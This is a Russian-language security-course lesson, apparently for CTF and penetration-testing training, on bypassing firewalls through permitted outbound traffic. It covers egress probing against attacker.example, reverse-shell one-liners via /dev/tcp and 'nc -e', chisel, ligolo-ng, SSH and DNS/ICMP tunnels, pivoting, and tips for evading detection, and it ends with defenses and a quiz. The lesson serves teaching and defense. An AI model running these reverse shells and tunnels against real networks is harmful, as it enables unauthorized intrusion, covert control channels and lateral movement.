---
id: network-firewall-piercing
title: "Пробивание firewall: reverse-сессии, разрешённые каналы и pivoting"
category: network
parent: network-firewall-evasion
difficulty: hard
order: 3
tags: [network, firewall, reverse-shell, tunneling, pivot, egress]
prerequisites: [network-firewall-evasion, network-covert]
useful_for:
  - "CTF Network (reverse-shell, pivot)"
  - "Пентест: доступ через ограниченный периметр"
  - "Работа: оценка egress-политик"
estimated_minutes: 50
summary: "Как обойти firewall, используя разрешённый исходящий трафик: reverse-shell, разрешённые протоколы/порты и pivoting внутрь сети."
---
Если входящие соединения блокированы, атакующий разворачивает направление: цель **сама** подключается наружу — по разрешённому каналу. Это основа reverse-shell и pivoting. Урок опирается на [`network-firewall-evasion`](network-firewall-evasion) и [`network-covert`](network-covert).

## Исходящая политика — главный союзник

- Firewall обычно **запрещает входящие**, но **разрешает исходящие** (для работы браузеров, обновлений, API).
- Значит, reverse-подключение проходит там, где bind-порт заблокирован.
- Даже строгий egress часто оставляет **DNS (53)**, **HTTP(S) (80/443)**, иногда NTP.
- Egress по IP-адресу (allowlist CDN) можно обойти domain fronting.
- Важно: многие периметры **stateful** — ответный трафик на уже установленное соединение проходит, а новый входящий — нет.

## Разведка egress-политики перед атакой

Прежде чем строить канал, выясните, **что вообще разрешено наружу**. Слепое тыканье портов тратит время и шумит.

```bash
# Разрешён ли исходящий HTTPS?
curl -m5 -k https://attacker.example/ -o /dev/null -w '%{http_code}\n'
# Разрешён ли DNS наружу?
dig @8.8.8.8 example.com +short
# Разрешён ли SSH?
nc -vz -w3 attacker.example 22
# Разрешён ли произвольный UDP?
nc -vzu -w3 attacker.example 1194
# Разрешён ли ICMP наружу?
ping -c1 -W2 attacker.example
```

Если работает только **DNS** — идите в [`network-dns-tunnel`](network-dns-tunnel). Если **HTTP(S)** — `chisel`/`ligolo-ng`. Если **ICMP** — `ptunnel`. Если **всё заблокировано** — остаётся физический канал/социальная инженерия (за рамками сетевого урока).

## Reverse-shell и его стабилизация

```bash
# Linux reverse
bash -i >& /dev/tcp/attacker/443 0>&1
nc -e /bin/sh attacker 443
# Слушатель
nc -lvnp 443
# Стабилизация TTY (python)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# затем Ctrl-Z; stty raw -echo; fg; export TERM=xterm
```

Инструменты: `pwncat` (автостабилизация и пост-эксплуатация), `penelope`, `revshells` (генератор однострочников), `socat` (надёжнее nc: `socat TCP-LISTEN:443,reuseaddr FILE:\`tty\`,raw,echo=0 TCP:attacker:443`). «Тупой» shell ломает job control, редакторы и Ctrl-C — стабилизация обязательна перед серьёзной работой.

## Инкапсуляция в разрешённые протоколы

```bash
# chisel — HTTP(S) reverse SOCKS
# attacker:  chisel server -p 443 --reverse --socks5
# victim:    chisel client https://attacker:443 R:socks
# proxychains к внутренним целям
proxychains4 -q nmap -sT -Pn 10.10.10.0/24

# ligolo-ng — TUN-интерфейс поверх TLS (прозрачный pivot)
# DNS-туннель при egress только на 53
iodine -f -P secret t.example.com
```

`chisel` даёт SOCKS5-прокси, через который любой инструмент ходит во внутреннюю сеть. `ligolo-ng` идёт дальше: поднимает TUN-интерфейс на стороне атакующего, и маршруты к внутренним подсетям добавляются штатно — не нужен `proxychains`, работает `nmap -sS`, `ping`, любой протокол.

## Разобранный пример: доступ к внутренней подсети

```bash
# 1. Цель подключается к нам (reverse)
# attacker:
chisel server -p 443 --reverse --socks5 &
# victim:
./chisel client https://attacker:443 R:socks
# -> 2024/10/11 12:00:00 client: Connecting to ws://attacker:443
# -> 2024/10/11 12:00:00 client: tun: proxy#R:127.0.0.1:1080=>socks: Listening
# 2. Через SOCKS — сканируем внутреннюю сеть
proxychains4 -q nmap -sT -Pn -p22,445,3389 10.10.10.0/24
# 3. Доступ к внутреннему сервису
proxychains4 -q curl http://10.10.10.20:8080/
# 4. Далее — новый reverse/pivot на следующем хосте
```

Каждый успешный хост становится новой точкой выхода: с него поднимается ещё один reverse-канал, и периметр «расползается» внутрь.

## Прокси и domain fronting

- **Прозрачный прокси** на периметре может сам вывести трафик; иногда достаточно корректных заголовков.
- **Domain fronting**: SNI указывает на разрешённый CDN-домен, а `Host` — на реальный; работает не везде (TLS 1.3/ECH усложняют).
- **Реверс-прокси** внутри DMZ можно использовать как точку выхода.
- **CDN-узлы** (Cloudflare и др.) маскируют реальный backend.

## Обход через доверенные хосты

- **Jump host / bastion** — легитимная точка входа; компрометация даёт доступ внутрь.
- **VPN-клиент** на хосте может уже иметь маршрут внутрь — используйте его.
- **WMI/WinRM/SMB** через уже установленные туннели (см. [`network-ntlm-relay`](network-ntlm-relay)).
- **SSH-agent forwarding** — переиспользование ключей для lateral movement.

## Стабилизация и надёжность канала

- **Автопереподключение**: systemd-юнит или цикл `while true; do chisel ...; sleep 5; done`.
- **Мультиплексирование**: несколько туннелей (разные порты/протоколы) на случай блокировки.
- **Keepalive**: `ServerAliveInterval`, ping внутри туннеля.
- **Проверка живости**: периодический health-check через туннель.
- **OPSEC**: не гнать объём через один канал; избегать всплесков, ломающих baseline.

## Выбор инструмента по ситуации

| Разрешено наружу | Инструмент | Тип туннеля |
|------------------|------------|-------------|
| HTTP(S) | chisel, ligolo-ng | SOCKS/TUN |
| SSH | `ssh -R`/`-D` | SOCKS/forward |
| только DNS | iodine, dnscat2 | DNS |
| только ICMP | ptunnel | TCP-over-ICMP |
| только NTP | ntp-туннель | узкий |
| ничего | соц. инженерия / USB | — |

## Защита

- **Egress-фильтрация** по назначению, а не «разрешить всё».
- **Инспекция** HTTP(S) (где допустимо), TLS-политики.
- **Ограничение DNS** корпоративными резолверами.
- **Сегментация**: DMZ-хост без маршрута внутрь (нет pivot).
- **Мониторинг** длительных исходящих соединений и аномалий.
- **EDR** с детектом reverse-shell и инструментов туннелирования.

## Частые ошибки

- **Держать bind-shell** при блокировке входящих — не сработает.
- **Не стабилизировать shell** — «тупой» терминал, теряются команды.
- **Туннелировать всё через один слабый канал** — риск обрыва.
- **Игнорировать egress на 53** — DNS-туннель пройдёт.
- **Забывать про IPv6-egress** — отдельный путь, часто не фильтруется.
- **Не проверять, что разрешено** — тратить время на заблокированные порты.

## Что дальше / решение

Маршрут: **разведать egress (curl/dig/nc/ping) → выбрать канал по разрешённому протоколу → поднять reverse-туннель (chisel/ligolo) → через SOCKS/TUN сканировать внутреннюю сеть → повторять pivot на каждом хосте**. Дальше — [`network-dns-tunnel`](network-dns-tunnel), [`network-ssh-tunnel`](network-ssh-tunnel), [`network-tunneling`](network-tunneling) и [`network-covert`](network-covert). Ключевые инструменты — chisel/ligolo-ng (HTTP), ssh (SOCKS), iodine/dnscat2 (DNS), ptunnel (ICMP). Защита — egress-фильтрация, сегментация без маршрута внутрь, инспекция и мониторинг.

## SSH-туннели: локальный, удалённый, динамический

SSH — самый «легальный» канал: он почти всегда разрешён наружу и не вызывает подозрений. Три режима:

```bash
# Локальный форвард: локальный порт -> удалённый сервис (проброс внутрь)
ssh -N -L 8080:10.10.10.20:80 user@jump
# Удалённый форвард (reverse): порт на нашем сервере -> цель
ssh -N -R 8080:127.0.0.1:8080 user@attacker
# Динамический (SOCKS5-прокси на локальном порту)
ssh -N -D 1080 user@jump
```

С `-D 1080` вы получаете SOCKS5-прокси и ходите `proxychains4 -q curl http://10.10.10.20/`. Удалённый форвард (`-R`) — это reverse: внутренний сервис «выставляется» на атакующем хосте, даже если входящие к цели заблокированы. Комбинация `-R` + `-D` даёт reverse-SOCKS одним инструментом. Добавляйте `-o ServerAliveInterval=30 -o ExitOnForwardFailure=yes`, чтобы туннель сам восстанавливался и не «висел» молча.

## ligolo-ng пошагово: прозрачный pivot

ligolo-ng поднимает TUN-интерфейс, поэтому работает прозрачно — без `proxychains` и `-sT`-ограничений:

```bash
# attacker: слушаем
./proxy -selfcert -laddr 0.0.0.0:11601
# victim: агент подключается обратно
./agent -connect attacker:11601 -ignore-cert
# в консоли proxy создаём интерфейс и маршрут
[Agent : victim] » session
[Agent : victim] » ifconfig        # узнать подсети
[Agent : victim] » start          # запустить туннель
# attacker (второй терминал): поднимаем TUN и маршрут
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.10.0/24 dev ligolo
nmap -sS -Pn 10.10.10.0/24         # полноценное сканирование
```

Плюс ligolo: full-TCP/UDP/ICMP, `nmap -sS` и `ping` работают как в родной сети. Минус: нужны права на TUN и правка таблицы маршрутов на атакующем.

## DNS- и ICMP-каналы в деталях

Когда разрешён только DNS, трафик упаковывают в запросы/ответы: `iodine` (полноценный IP-over-DNS с TUN-интерфейсом) или `dnscat2` (C2-канал с командами). `iodine -f -P secret t.example.com` требует собственный авторитетный NS для домена. ICMP-канал (`ptunnel`) инкапсулирует TCP в echo-request/reply — работает при `ping`, разрешённом наружу, но легко детектируется по размеру/частоте пакетов. Оба канала **медленные** (десятки-сотни КБ/с) — годятся для управления и лёгкой эксфильтрации, но не для больших объёмов.

## Инструменты сравнения

| Инструмент | Канал | Особенность |
|---|---|---|
| chisel | HTTP(S) | SOCKS5, один бинарь, легко |
| ligolo-ng | TLS | TUN, прозрачно, full-TCP |
| ssh -R/-D | SSH | легитимно, SOCKS/forward |
| iodine | DNS | IP-over-DNS, нужен NS |
| dnscat2 | DNS | C2-фреймворк |
| ptunnel | ICMP | TCP-over-ICMP |
| socat | любой | гибкий, «швейцарский нож» |

## OPSEC туннелирования и что видит защита

Сетевой детект смотрит на поведение, а не на инструмент. Признаки туннеля: длительное соединение на нестандартный внешний порт, стабильный поток «в обе стороны» с малой вариативностью, регулярные интервалы keepalive, TLS-соединение к домену без браузерного профиля, DNS-запросы с аномально длинными поддоменами или высокой энтропией. Чтобы снизить заметность: используйте порт 443, домен, похожий на легитимный, добавляйте джиттер в тайминги, ограничивайте скорость и не гоните объём. Против **TLS-инспекции** помогает настоящий TLS-сертификат (chisel/ligolo с валидным cert), а не самоподписанный — самоподписанный легко отсекается на прокси.

## Квиз

```quiz
- question: "Почему reverse-shell часто надёжнее bind-shell при наличии firewall?"
  options:
    - "Потому что firewall обычно разрешает исходящие соединения"
    - "Потому что он быстрее"
    - "Потому что он не требует сети"
    - "Потому что он шифрует трафик"
  answer: 0
  explanation: "Входящие блокируются, исходящие обычно разрешены — поэтому цель подключается к вам."
- question: "Какой инструмент создаёт reverse SOCKS-туннель поверх HTTP(S)?"
  options:
    - "chisel"
    - "arpwatch"
    - "dnsmasq"
    - "aireplay-ng"
  answer: 0
  explanation: "chisel (и ligolo-ng) дают туннель через разрешённый HTTP/HTTPS-канал."
- question: "Какой протокол позволяет туннель даже при egress только на 53?"
  options:
    - "DNS"
    - "SMTP"
    - "NTP"
    - "RIP"
  answer: 0
  explanation: "DNS почти всегда разрешён наружу; поверх него строят туннель (iodine/dnscat2)."
- question: "Зачем стабилизируют reverse-shell?"
  options:
    - "Чтобы получить TTY, job control и нормальную работу с редакторами"
    - "Чтобы ускорить сеть"
    - "Чтобы включить IPv6"
    - "Чтобы обойти firewall"
  answer: 0
  explanation: "pty.spawn + stty дают полноценный терминал вместо «тупого» shell."
- question: "Какая защита делает DMZ-хост бесполезным как pivot?"
  options:
    - "Egress-фильтрация и сегментация без маршрута внутрь"
    - "Отключение IPv6"
    - "Больше NAT"
    - "STP"
  answer: 0
  explanation: "Ограничение исходящих и отсутствие маршрута внутрь не дают пивотировать."
```

## Где пригодится

- **CTF:** reverse-shell и pivot к внутренним сетям.
- **Пентест:** доступ через ограниченный периметр.
- **Red team:** устойчивые каналы управления.
- **Работа:** оценка egress-политик и сегментации.
- **SOC:** детект туннелей и reverse-сессий.
